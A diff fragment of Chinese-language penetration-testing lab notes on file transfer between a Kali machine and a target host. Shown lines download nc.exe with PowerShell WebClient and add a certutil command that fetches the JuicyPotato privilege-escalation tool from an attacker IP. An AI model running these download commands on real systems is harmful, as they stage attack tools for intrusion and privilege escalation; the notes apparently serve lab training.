@@ -13,6 +13,8 @@ TCM登录
 
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/nc.exe','C:\temp\nc.exe')"
 
+certutil -urlcache -split -f "http://192.168.49.102/JuicyPotato.exe" JuicyPotato.exe
+
 2. 从靶机传文件回kali
 
 接收端：
